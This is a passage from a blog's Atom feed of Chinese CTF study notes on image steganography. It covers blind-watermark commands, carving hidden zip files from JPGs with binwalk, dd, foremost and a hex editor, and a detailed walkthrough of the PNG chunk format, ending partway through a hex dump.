    <content type="html"><![CDATA[<h1 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h1><h1 id="BlindWaterMark"><a href="#BlindWaterMark" class="headerlink" title="BlindWaterMark"></a>BlindWaterMark</h1><p>合成盲水印图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python bwmforpy3.py encode hui.png wm_py3.png hui_wm_py3.png<br></code></pre></td></tr></table></figure><p>提取图中的盲水印 (需要原图)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python bwmforpy3.py decode hui.png hui_wm_py3.png wm_out_py3.png<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-10-29 10:55:51<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/putcf547zx7onfxk">https://www.yuque.com/chaye-apqbl/vsc85q/putcf547zx7onfxk</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E7%8C%AB%E5%8F%98%E6%8D%A2/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E7%8C%AB%E5%8F%98%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="猫变换"><a href="#猫变换" class="headerlink" title="猫变换"></a>猫变换</h1><blockquote><p>更新: 2025-08-17 13:24:19<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wrpun4r5pwl4gc0p">https://www.yuque.com/chaye-apqbl/vsc85q/wrpun4r5pwl4gc0p</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E5%9B%BE%E7%89%87%E7%AF%87/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E5%9B%BE%E7%89%87%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="图片篇"><a href="#图片篇" class="headerlink" title="图片篇"></a>图片篇</h1><h1 id="【CTF-MISC】图片隐写题（binwalk-foremost-010editer配合使用）-binwalk和foremost区别-CSDN博客"><a href="#【CTF-MISC】图片隐写题（binwalk-foremost-010editer配合使用）-binwalk和foremost区别-CSDN博客" class="headerlink" title="【CTF&#x2F;MISC】图片隐写题（binwalk&#x2F;foremost&#x2F;010editer配合使用）_binwalk和foremost区别-CSDN博客"></a><a href="https://blog.csdn.net/mengmeng0510/article/details/120933296">【CTF&#x2F;MISC】图片隐写题（binwalk&#x2F;foremost&#x2F;010editer配合使用）_binwalk和foremost区别-CSDN博客</a></h1><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="先用binwalk和010看一下有没有隐藏文件"><a href="#先用binwalk和010看一下有没有隐藏文件" class="headerlink" title="先用binwalk和010看一下有没有隐藏文件"></a>先用binwalk和010看一下有没有隐藏文件</h2><h2 id="分离文件"><a href="#分离文件" class="headerlink" title="分离文件"></a>分离文件</h2><h3 id="用binwalk分离文件，使用dd命令分离出隐藏文件："><a href="#用binwalk分离文件，使用dd命令分离出隐藏文件：" class="headerlink" title="用binwalk分离文件，使用dd命令分离出隐藏文件："></a>用binwalk分离文件，<font style="color:rgb(51, 51, 51);">使用dd命令分离出隐藏文件：</font></h3><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722227072142-346b9241-bfe7-4f7d-a1dc-7b5c80bd131a-938543.png" alt="1722227072142-346b9241-bfe7-4f7d-a1dc-7b5c80bd131a.png"></p><p><font style="color:rgb(51, 51, 51);">从分析的结果看，这个jpg文件隐藏着一个zip文件，从48221块偏移开始就是zip文件。</font></p><p>dd if&#x3D;1.jpg of&#x3D;1.zip skip&#x3D;48221 bs&#x3D;1</p><p><font style="color:rgb(51, 51, 51);">解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过48221个块后开始复制，bs设</font><br><font style="color:rgb(51, 51, 51);">置每次读写块的大小为1字节</font></p><h3 id="用foremost分离文件"><a href="#用foremost分离文件" class="headerlink" title="用foremost分离文件"></a><font style="color:rgb(51, 51, 51);">用foremost分离文件</font></h3><p> foremost 1.jpg</p><p><font style="color:rgb(51, 51, 51);">执行命令后，foremost会生成output目录存放分离出的文件。</font></p><h3 id="hex编辑器分离文件"><a href="#hex编辑器分离文件" class="headerlink" title="hex编辑器分离文件"></a><font style="color:rgb(51, 51, 51);">hex编辑器分离文件</font></h3><p><font style="color:rgb(51, 51, 51);">hex编辑器有很多，win下有用得较多的winhex、UltraEdit等，linux下有hexeditor等。这里我们以winhex为例来手动分离。</font></p><p><font style="color:rgb(51, 51, 51);">一个完整的 jpg 文件由 FF D8 开头，FF D9结尾，图片查看器会忽略 FF D9 以后的内容，因此可以在 jpg 文件中加入其他文件。</font></p><p><font style="color:rgb(51, 51, 51);">经过上面的分析， 知道图片中隐藏了zip文件，zip文件的开头16进制为504B0304，先搜索16进制文本 FFD9，然后后面跟着504B0304，于是就可以从 50 开始，复制到最后（因为这里只有一个zip，所以复制到最后），另存为新文件，就得到了隐藏的压缩包。</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722227208966-152c9565-b402-4688-9d80-def766efba4b-668118.png" alt="1722227208966-152c9565-b402-4688-9d80-def766efba4b.png"></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722227215544-ef217cc4-940c-4031-b463-43a0d48f830d-011012.png" alt="1722227215544-ef217cc4-940c-4031-b463-43a0d48f830d.png"></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722227238415-eefed1c1-83f7-4710-8da0-85ba0fbd88dd-462766.png" alt="1722227238415-eefed1c1-83f7-4710-8da0-85ba0fbd88dd.png"></p><h3 id="改后缀名"><a href="#改后缀名" class="headerlink" title="改后缀名"></a>改后缀名</h3><p><font style="color:rgb(51, 51, 51);">分析知道隐藏文件是zip后，有一个简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）。</font></p><h1 id="PNG文件格式详解"><a href="#PNG文件格式详解" class="headerlink" title="PNG文件格式详解"></a><font style="color:rgb(34, 34, 38);">PNG文件格式详解</font></h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a><font style="color:rgb(79, 79, 79);">概述</font></h3><p><font style="color:rgb(77, 77, 77);">PNG是20世纪90年代中期开始开发的图像文件存储格式，其目的是替代GIF和</font><a href="https://so.csdn.net/so/search?q=TIFF&spm=1001.2101.3001.7020">TIFF</a><font style="color:rgb(77, 77, 77);">文件格式，同时增加一些GIF文件格式所不具备的特性。流式网络图形格式(Portable Network Graphic Format，PNG)名称来源于非官方的“PNG’s Not GIF”，是一种位图文件(bitmap file)存储格式，读成“ping”。PNG用来存储灰度图像时，灰度图像的深度可多到16位，存储彩色图像时，彩色图像的深度可多到48位，并且还可存储多到16位的α通道数据。PNG使用从LZ77派生的无损数据压缩算法。（说白了这就是一种方便的、适于网络传播的轻便图片文件格式）</font></p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a><font style="color:rgb(79, 79, 79);">特性</font></h3><ol><li><font style="color:rgb(51, 51, 51);">使用调色板技术可支持256种颜色的彩色图像。（必须的）</font></li><li><font style="color:rgb(51, 51, 51);">流式读&#x2F;写性(streamability)：图像文件格式允许连续读出和写入图像数据。（因此适于网络传播）</font></li><li><font style="color:rgb(51, 51, 51);">逐次逼近显示(progressive display)：这种特性可使在通信链路上传输图像文件的同时就在终端上显示图像，把整个轮廓显示出来之后逐步显示图像的细节，也就是先用低分辨率显示图像，然后逐步提高它的分辨率。（类似马赛克逐渐消除的过程）</font></li><li><font style="color:rgb(51, 51, 51);">透明性(transparency)：这个性能可使图像中某些部分不显示出来，用来创建一些有特色的图像。</font></li><li><font style="color:rgb(51, 51, 51);">辅助信息(ancillary information)：这个特性可用来在图像文件中存储一些文本注释信息。（就是可以说一些废话）</font></li><li><font style="color:rgb(51, 51, 51);">独立于计算机软硬件环境。</font></li><li><font style="color:rgb(51, 51, 51);">使用无损压缩。（无损！）</font></li><li><font style="color:rgb(51, 51, 51);">可在一个文件中存储多幅图像。</font></li></ol><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a><font style="color:rgb(79, 79, 79);">文件结构</font></h3><p><font style="color:rgb(77, 77, 77);">PNG图像格式文件由文件署名和数据块(chunk)组成。</font></p><h4 id="文件署名域"><a href="#文件署名域" class="headerlink" title="文件署名域"></a><font style="color:rgb(79, 79, 79);">文件署名域</font></h4><p><font style="color:rgb(77, 77, 77);">8字节的PNG文件署名域用来识别该文件是不是PNG文件。该域的值是：</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">十进制数</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">十六进制数</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">137</font></td><td align="left"><font style="color:rgb(79, 79, 79);">89</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">80</font></td><td align="left"><font style="color:rgb(79, 79, 79);">50</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">78</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4e</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">71</font></td><td align="left"><font style="color:rgb(79, 79, 79);">47</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">13</font></td><td align="left"><font style="color:rgb(79, 79, 79);">0d</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">10</font></td><td align="left"><font style="color:rgb(79, 79, 79);">0a</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">26</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1a</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">10</font></td><td align="left"><font style="color:rgb(79, 79, 79);">0a</font></td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">这个文件署名就是在</font><a href="https://blog.mythsman.com/2015/12/01/1/">《利用文件头标志判断文件类型》</a><font style="color:rgb(77, 77, 77);">中提到的文件头标志了，很简单。</font></p><h4 id="数据块"><a href="#数据块" class="headerlink" title="数据块"></a><font style="color:rgb(79, 79, 79);">数据块</font></h4><p><font style="color:rgb(77, 77, 77);">这里有两种类型的数据块，一种是称为关键数据块(critical chunk)，就是必须要有的块；另一种叫做辅助数据块(ancillary chunks)。</font></p><p><font style="color:rgb(77, 77, 77);">每个数据块都由下表所示的的4个域组成。</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">名称</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">字节数</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">说明</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">Length(长度)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4字节</font></td><td align="left"><font style="color:rgb(79, 79, 79);">指定数据块中数据域的长度，其长度不超过(231−1)(231−1)字节</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Chunk Type Code(数据块类型码)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4字节</font></td><td align="left"><font style="color:rgb(79, 79, 79);">数据块类型码由ASCII字母(A-Z和a-z)组成</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Chunk Data(数据块实际内容</font></td><td align="left"><font style="color:rgb(79, 79, 79);">可变长度</font></td><td align="left"><font style="color:rgb(79, 79, 79);">存储按照Chunk Type Code指定的数据</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">CRC(循环冗余检测</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4字节</font></td><td align="left"><font style="color:rgb(79, 79, 79);">存储用来检测是否有错误的循环冗余码</font></td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">其中CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的，可以看做一种校验码。</font></p><h4 id="关键数据块"><a href="#关键数据块" class="headerlink" title="关键数据块"></a><font style="color:rgb(79, 79, 79);">关键数据块</font></h4><p><font style="color:rgb(77, 77, 77);">关键数据块中的4个标准数据块是：</font></p><p><font style="color:rgb(77, 77, 77);">(1) 文件头数据块IHDR(header chunk)：</font></p><p><font style="color:rgb(77, 77, 77);">它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</font></p><p><font style="color:rgb(77, 77, 77);">文件头数据块由13字节，组成结构如下：</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">域的名称</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">字节数</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">说明</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">Width</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4 bytes</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像宽度，以像素为单位</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Height</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4 bytes</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像高度，以像素为单位</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Bit depth</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像深度：索引彩色图像：1，2，4或8 ;灰度图像：1，2，4，8或16 ;真彩色图像：8或16</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">ColorType</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">颜色类型：0：灰度图像, 1，2，4，8或16;2：真彩色图像，8或16;3：索引彩色图像，1，2，4或84：带α通道数据的灰度图像，8或16;6：带α通道数据的真彩色图像，8或16</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Compression method</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">压缩方法(LZ77派生算法)</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Filter method</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">滤波器方法</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Interlace method</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">隔行扫描方法：0：非隔行扫描;1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</font></td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">(2) 调色板数据块PLTE(palette chunk)：</font></p><p><font style="color:rgb(77, 77, 77);">它包含有与索引彩色图像((indexed-color image))相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。真彩色的PNG数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。结构如下：</font></p><p><font style="color:rgb(77, 77, 77);">|颜色|字节|意义|<br></font><font style="color:rgb(77, 77, 77);">|Red|1 byte||0 &#x3D; 黑色, 255 &#x3D; 红|<br></font><font style="color:rgb(77, 77, 77);">|Green|1 byte||0 &#x3D; 黑色, 255 &#x3D; 绿色|<br></font><font style="color:rgb(77, 77, 77);">|Blue|1 byte||0 &#x3D; 黑色, 255 &#x3D; 蓝色|</font></p><p><font style="color:rgb(77, 77, 77);">PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，因此调色板数据块所包含的最大字节数为768，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</font></p><p><font style="color:rgb(77, 77, 77);">对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</font></p><p><font style="color:rgb(77, 77, 77);">(3) 图像数据块IDAT(image data chunk)：</font></p><p><font style="color:rgb(77, 77, 77);">它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</font></p><p><font style="color:rgb(77, 77, 77);">IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</font></p><p><font style="color:rgb(77, 77, 77);">(4) 图像结束数据IEND(image trailer chunk)：</font></p><p><font style="color:rgb(77, 77, 77);">它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</font></p><p><font style="color:rgb(77, 77, 77);">如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</font></p><p><font style="color:rgb(77, 77, 77);">00 00 00 00 49 45 4E 44 AE 42 60 82</font></p><p><font style="color:rgb(77, 77, 77);">不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</font></p><p><font style="color:rgb(77, 77, 77);">最后，除了表示数据块开始的IHDR必须放在最前面， 表示PNG文件结束的IEND数据块放在最后面之外，其他数据块的存放顺序没有限制。</font></p><h4 id="辅助数据块"><a href="#辅助数据块" class="headerlink" title="辅助数据块"></a><font style="color:rgb(79, 79, 79);">辅助数据块</font></h4><p><font style="color:rgb(77, 77, 77);">（比较杂，不需要全部了解透）</font></p><p><font style="color:rgb(77, 77, 77);">PNG文件格式规范制定的10个辅助数据块是：</font></p><ol><li><font style="color:rgb(51, 51, 51);">背景颜色数据块bKGD(background color)。</font></li><li><font style="color:rgb(51, 51, 51);">基色和白色度数据块cHRM(primary chromaticities and white point)。所谓白色度是指当R＝G＝B＝最大值时在显示器上产生的白色度。</font></li><li><font style="color:rgb(51, 51, 51);">图像γ数据块gAMA(image gamma)。</font></li><li><font style="color:rgb(51, 51, 51);">图像直方图数据块hIST(image histogram)。</font></li><li><font style="color:rgb(51, 51, 51);">物理像素尺寸数据块pHYs(physical pixel dimensions)。</font></li><li><font style="color:rgb(51, 51, 51);">样本有效位数据块sBIT(significant bits)。</font></li><li><font style="color:rgb(51, 51, 51);">文本信息数据块tEXt(textual data)。</font></li><li><font style="color:rgb(51, 51, 51);">图像最后修改时间数据块tIME (image last-modification time)。</font></li><li><font style="color:rgb(51, 51, 51);">图像透明数据块tRNS (transparency)。</font></li><li><font style="color:rgb(51, 51, 51);">压缩文本数据块zTXt (compressed textual data)。</font></li></ol><h4 id="数据块摘要"><a href="#数据块摘要" class="headerlink" title="数据块摘要"></a><font style="color:rgb(79, 79, 79);">数据块摘要</font></h4><p><font style="color:rgb(77, 77, 77);">关键数据块、辅助数据块和专用公共数据块(special-purpose public chunks)综合下表中：</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">数据块符号</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">数据块名称</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">多数据块</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">可选否</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">位置限制</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">IHDR</font></td><td align="left"><font style="color:rgb(79, 79, 79);">文件头数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">第一块</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">cHRM</font></td><td align="left"><font style="color:rgb(79, 79, 79);">基色和白色点数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE和IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">gAMA</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像γ数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE和IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">sBIT</font></td><td align="left"><font style="color:rgb(79, 79, 79);">样本有效位数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE和IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">PLTE</font></td><td align="left"><font style="color:rgb(79, 79, 79);">调色板数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">bKGD</font></td><td align="left"><font style="color:rgb(79, 79, 79);">背景颜色数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE之后IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">hIST</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像直方图数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE之后IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">tRNS</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像透明数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE之后IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">oFFs</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">pHYs</font></td><td align="left"><font style="color:rgb(79, 79, 79);">物理像素尺寸数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">sCAL</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">IDAT</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">与其他IDAT连续</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">tIME</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像最后修改时间数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">tEXt</font></td><td align="left"><font style="color:rgb(79, 79, 79);">文本信息数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">zTXt</font></td><td align="left"><font style="color:rgb(79, 79, 79);">压缩文本数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">fRAc</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">gIFg</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">gIFt</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">gIFx</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">IEND</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像结束数据</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">最后一个数据块</font></td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">tEXt和zTXt数据块中的标准关键字：</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">关键字</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">说明</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">Title</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像名称或者标题</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Author</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像作者名</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Description</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像说明</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Copyright</font></td><td align="left"><font style="color:rgb(79, 79, 79);">版权声明</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">CreationTime</font></td><td align="left"><font style="color:rgb(79, 79, 79);">原图创作时间</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Software</font></td><td align="left"><font style="color:rgb(79, 79, 79);">创作图像使用的软件</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Disclaimer</font></td><td align="left"><font style="color:rgb(79, 79, 79);">弃权</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Warning</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像内容警告</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Source</font></td><td align="left"><font style="color:rgb(79, 79, 79);">创作图像使用的设备</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Comment</font></td><td align="left"><font style="color:rgb(79, 79, 79);">各种注释</font></td></tr></tbody></table><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a><font style="color:rgb(79, 79, 79);">一个例子</font></h3><p><font style="color:rgb(77, 77, 77);">为了便于研究，我在本地找了个24x24像素的图片：</font></p><p><font style="color:rgb(77, 77, 77);">用十六进制打开后是这样的：</font></p><p>| <code>plain 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 </code>  | <code>plain 0000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR 0000010: 0000 0018 0000 0018 0806 0000 00e0 773d  ..............w= 0000020: f800 0000 1974 4558 7453 6f66 7477 6172  .....tEXtSoftwar 0000030: 6500 4164 6f62 6520 496d 6167 6552 6561  e.Adobe ImageRea 0000040: 6479 71c9 653c 0000 0344 4944 4154 78da  dyq.e&lt;...DIDATx. 0000050: b454 4b48 5b51 10bd 792f 2646 a346 7411  .TKH[Q..y/&amp;F.Ft. 0000060: 450b cac3 6840 8c14 0242 8542 e9aa ab42  E...h@...B.B...B 0000070: 5785 8614 c428 b4d0 5569 b108 5dbb 29b4  W....(..Ui..].). 0000080: 1b05 a5ab 6cb3 2a14 0ab5 8b42 75a3 d188  ....l.*....Bu... 0000090: 82c6 0ff1 4320 a2e2 2f7e 12ed 9c47 e671  ....C ../~...G.q 00000a0: 8d2f 8950 3a30 dcc7 bb33 67e6 cee7 5826  ./.P:0...3g...X&amp; 00000b0: 2626 8499 288a a2ab d56a d555 55d5 57d7  &amp;&amp;..(....j.UU.W. 00000c0: d7d7 be6c 36fb fef2 f232 45a7 b8ba ba12  ...l6....2E..... 00000d0: c160 5014 13ab d94f 8bc5 72e3 24e0 